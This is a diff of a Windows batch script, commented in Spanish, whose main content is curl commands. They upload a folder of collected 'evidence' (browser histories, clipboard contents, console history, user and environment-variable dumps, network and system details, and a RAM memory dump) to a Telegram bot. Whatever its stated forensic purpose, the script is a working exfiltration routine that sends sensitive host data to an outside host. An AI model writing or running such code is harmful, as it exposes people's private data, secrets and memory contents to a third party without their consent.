@@ -189,59 +189,59 @@ echo [INFO] Probando conexión con Telegram...
 curl.exe -s "https://api.telegram.org/bot%BOT_TOKEN%/getMe"
 echo.
 
-:: Enviar archivos de texto (con mensajes visibles)
+:: Enviar archivos de texto UNO POR UNO
 echo [INFO] Enviando 00_INFORME_FINAL.txt...
-curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
+curl.exe -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
 echo.
 
 echo [INFO] Enviando 01_historial_navegacion.txt...
-curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\01_historial_navegacion.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
+curl.exe -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\01_historial_navegacion.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
 echo.
 
 echo [INFO] Enviando 02_portapapeles.txt...
-curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\02_portapapeles.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
+curl.exe -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\02_portapapeles.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
 echo.
 
 echo [INFO] Enviando 03_historial_consola.txt...
-curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\03_historial_consola.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
+curl.exe -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\03_historial_consola.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
 echo.
 
 echo [INFO] Enviando 04_estructura_MAC.txt...
-curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\04_estructura_MAC.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
+curl.exe -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\04_estructura_MAC.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
 echo.
 
 echo [INFO] Enviando 05_sistema.txt...
-curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\05_sistema.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
+curl.exe -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\05_sistema.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
 echo.
 
 echo [INFO] Enviando 06_red.txt...
-curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\06_red.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
+curl.exe -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\06_red.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
 echo.
 
 echo [INFO] Enviando 07_usuarios.txt...
-curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\07_usuarios.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
+curl.exe -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\07_usuarios.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
 echo.
 
 echo [INFO] Enviando 08_variables.txt...
-curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\08_variables.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
+curl.exe -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\08_variables.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
 echo.
 
 echo [INFO] Enviando 09_discos.txt...
-curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\09_discos.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
+curl.exe -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\09_discos.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
 echo.
 
 echo [INFO] Enviando chrome_history_backup.txt...
-curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\chrome_history_backup.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
+curl.exe -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\chrome_history_backup.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
 echo.
 
 echo [INFO] Enviando edge_history_backup.txt...
-curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\edge_history_backup.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
+curl.exe -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\edge_history_backup.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
 echo.
 
 :: Enviar volcado de RAM (si existe)
 if exist C:\EVIDENCIAS_COMPLETAS\memory.dmp (
     echo [INFO] Enviando memory.dmp (esto puede tardar varios minutos)...
-    curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\memory.dmp" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
+    curl.exe -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\memory.dmp" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
     echo [OK] Volcado de RAM enviado.
 ) else (
     echo [ERROR] No se encontró memory.dmp
